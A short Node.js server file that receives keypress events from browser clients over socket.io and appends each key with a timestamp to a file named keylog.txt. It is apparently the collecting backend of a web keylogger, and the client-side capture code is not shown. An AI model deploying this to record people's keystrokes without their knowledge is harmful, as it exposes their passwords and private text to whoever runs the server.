const express = require('express');
const fs = require('fs');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Log keystrokes to a file
const logFilePath = path.join(__dirname, 'logs', 'keylog.txt');

// Ensure the logs directory exists
if (!fs.existsSync(path.join(__dirname, 'logs'))) {
  fs.mkdirSync(path.join(__dirname, 'logs'));
}

// Handle keypress events sent from the frontend
io.on('connection', (socket) => {
  socket.on('keypress', (key) => {
    const logEntry = `${new Date().toISOString()}: ${key}\n`;
    fs.appendFile(logFilePath, logEntry, (err) => {
      if (err) {
        console.error('Failed to log keypress:', err);
      }
    });
  });
});

// Start the server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
